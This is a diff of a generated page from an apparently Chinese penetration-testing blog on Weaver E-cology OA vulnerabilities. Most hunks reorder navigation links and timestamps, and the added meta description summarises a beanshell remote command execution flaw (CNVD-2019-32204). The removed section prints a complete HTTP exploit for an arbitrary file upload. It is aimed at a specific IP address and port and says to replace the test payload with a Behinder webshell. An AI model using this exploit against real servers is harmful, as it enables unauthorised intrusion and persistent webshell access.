@@ -9,15 +9,15 @@
         <meta name="keywords" content="Weaver-Ecology-OA(泛微)" />
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="应用简介泛微OA，协同办公平台 泛微OA 9前台任意文件上传漏洞位于: &#x2F;page&#x2F;exportImport&#x2F;uploadOperation.jsp文件中 EXP POST &#x2F;page&#x2F;exportImport&#x2F;uploadOperation.jsp HTTP&#x2F;1.1Host: 112.91.144.90:5006Content-Type:multipart&#x2F;form-data; boundary">
+    <meta name="description" content="应用简介泛微OA，协同办公平台 [CNVD-2019-32204]-远程命令执行漏洞概述 #影响范围E-cology 7.0E-cology 8.0E-cology 8.1E-cology 9.0  由于beanshell这个接口可被未授权访问，同时这个接口在接受用户请求时未进行相应过滤，最终导致远程命令执行 漏洞利用 直接在网站根目录后加入组件访问路径 &#x2F;weaver&#x2F;bsh.servlet.B">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Weaver-Ecology-OA(泛微)">
 <meta property="og:url" content="https://wintrysec.github.io/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weaver-Ecology-OA(%E6%B3%9B%E5%BE%AE)/weaver-oa/index.html">
 <meta property="og:site_name" content="wintrysec">
-<meta property="og:description" content="应用简介泛微OA，协同办公平台 泛微OA 9前台任意文件上传漏洞位于: &#x2F;page&#x2F;exportImport&#x2F;uploadOperation.jsp文件中 EXP POST &#x2F;page&#x2F;exportImport&#x2F;uploadOperation.jsp HTTP&#x2F;1.1Host: 112.91.144.90:5006Content-Type:multipart&#x2F;form-data; boundary">
+<meta property="og:description" content="应用简介泛微OA，协同办公平台 [CNVD-2019-32204]-远程命令执行漏洞概述 #影响范围E-cology 7.0E-cology 8.0E-cology 8.1E-cology 9.0  由于beanshell这个接口可被未授权访问，同时这个接口在接受用户请求时未进行相应过滤，最终导致远程命令执行 漏洞利用 直接在网站根目录后加入组件访问路径 &#x2F;weaver&#x2F;bsh.servlet.B">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-12-14T01:55:31.846Z">
-<meta property="article:modified_time" content="2020-12-12T00:28:30.324Z">
+<meta property="article:published_time" content="2020-12-14T14:11:01.637Z">
+<meta property="article:modified_time" content="2020-12-21T12:03:12.491Z">
 <meta property="article:author" content="wintrysec">
 <meta name="twitter:card" content="summary">
     
@@ -68,7 +68,7 @@
     
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
     
-<meta name="generator" content="Hexo 4.2.0"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body>
     <div id="container">
@@ -186,7 +186,7 @@
                             &nbsp;
                             【2】工具手册
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/Metasploit/">Metasploit漏洞利用框架</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8Bsqlmap%E5%A4%87%E5%BF%98/">sqlmap简要手册</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BNmap/">nmap端口扫描</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BBurpSuite/">BurpSuite简要手册</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BNmap/">nmap端口扫描</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8BBurpSuite/">BurpSuite简要手册</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/Metasploit/">Metasploit漏洞利用框架</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%902%E3%80%91%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C%E4%B9%8Bsqlmap%E5%A4%87%E5%BF%98/">sqlmap简要手册</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -229,7 +229,7 @@
                             &nbsp;
                             【4】权限维持
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/11/02/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">【1】文件传输</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/DNS%E4%B8%8A%E7%BA%BFC2/">【6】DNS上线CS</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E5%8F%8D%E5%BC%B9Shell/">【2】反弹shell</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Webshell/">【3】WebShell</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">【4】权限提升</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/">【5】系统后门</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/11/02/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/">【1】文件传输</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/DNS%E4%B8%8A%E7%BA%BFC2/">【6】DNS上线CS</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">【4】权限提升</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Webshell/">【3】WebShell</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E5%8F%8D%E5%BC%B9Shell/">【2】反弹shell</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%904%E3%80%91%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/">【5】系统后门</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -238,7 +238,7 @@
                             &nbsp;
                             【5】横向移动
                         </a>
-                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【3】Hash传递攻击</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">【1】内网信息收集</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%9C%AC%E6%9C%BA%E5%AF%86%E7%A0%81%E5%92%8C%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/">【2】本机密码和散列值获取</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/">【6】指定主机上线</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【4】票据传递攻击</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">【5】黄金票据和白银票据</a></li>  </ul> 
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/Hash%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【3】Hash传递攻击</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">【1】内网信息收集</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF/">【6】指定主机上线</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E6%9C%AC%E6%9C%BA%E5%AF%86%E7%A0%81%E5%92%8C%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/">【2】本机密码和散列值获取</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">【4】票据传递攻击</a></li>  <li class="file"><a href="/2020/12/14/%E3%80%903%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E3%80%905%E3%80%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/">【5】黄金票据和白银票据</a></li>  </ul> 
                     </li> 
                     
                     <li class="directory">
@@ -619,7 +619,7 @@
     <div class="article-date">
         <i class="fa fa-calendar"></i>
         <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weaver-Ecology-OA(%E6%B3%9B%E5%BE%AE)/weaver-oa/">
-            <time datetime="2020-12-14T01:55:31.846Z" itemprop="datePublished">2020-12-14</time>
+            <time datetime="2020-12-14T14:11:01.637Z" itemprop="datePublished">2020-12-14</time>
         </a>
     </div>
 
@@ -648,11 +648,6 @@
         
         
             <h2 id="应用简介"><a href="#应用简介" class="headerlink" title="应用简介"></a>应用简介</h2><p><a href="https://www.weaver.com.cn/e9/?source=1&kw=ppc-190319-1&bd_vid=11544877500503095345" target="_blank" rel="noopener">泛微OA</a>，协同办公平台</p>
-<h2 id="泛微OA-9前台任意文件上传"><a href="#泛微OA-9前台任意文件上传" class="headerlink" title="泛微OA 9前台任意文件上传"></a>泛微OA 9前台任意文件上传</h2><p>漏洞位于: <code>/page/exportImport/uploadOperation.jsp</code>文件中</p>
-<p><strong>EXP</strong></p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/page/exportImport/uploadOperation.jsp</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 112.91.144.90:5006</span><br><span class="line">Content-Type:multipart/form-data; boundary=_7oLrplgUbU3CeDBqVeX3F5ByzJPkjf1-</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Length</span>: 242</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--_7oLrplgUbU3CeDBqVeX3F5ByzJPkjf1-</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="2.jsp"</span><br><span class="line"><span class="attribute">Content-Type</span>: application-stream</span><br><span class="line"><span class="attribute">Content-Teansfer-Encoding:binary</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">&lt;%out.print("123");%&gt;</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">--_7oLrplgUbU3CeDBqVeX3F5ByzJPkjf1---</span></span><br></pre></td></tr></table></figure>
-
-<p>替换上边<code>&lt;%out.print(&quot;123&quot;);%&gt;</code>的地方为冰蝎马即可</p>
 <h2 id="CNVD-2019-32204-远程命令执行"><a href="#CNVD-2019-32204-远程命令执行" class="headerlink" title="[CNVD-2019-32204]-远程命令执行"></a>[CNVD-2019-32204]-远程命令执行</h2><p><strong>漏洞概述</strong></p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">#影响范围</span><br><span class="line">E-cology 7.0</span><br><span class="line">E-cology 8.0</span><br><span class="line">E-cology 8.1</span><br><span class="line">E-cology 9.0</span><br></pre></td></tr></table></figure>
 
@@ -706,19 +701,19 @@
     
 <nav id="article-nav">
     
-        <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/ThinkPHP/thinkphp/" id="article-nav-newer" class="article-nav-link-wrap">
+        <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Weblogic/weblogic/" id="article-nav-newer" class="article-nav-link-wrap">
             <strong class="article-nav-caption">Newer</strong>
             <div class="article-nav-title">
                 
-                    Apache-Log4j
+                    Weblogic
                 
             </div>
         </a>
     
     
-        <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Tongda-OA(%E9%80%9A%E8%BE%BE)/tongda-oa/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2020/12/14/%E3%80%904%E3%80%91%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Wordpress/wordpress/" id="article-nav-older" class="article-nav-link-wrap">
             <strong class="article-nav-caption">Older</strong>
-            <div class="article-nav-title">Tongda-OA(通达)</div>
+            <div class="article-nav-title">Wordpress</div>
         </a>
     
 </nav>
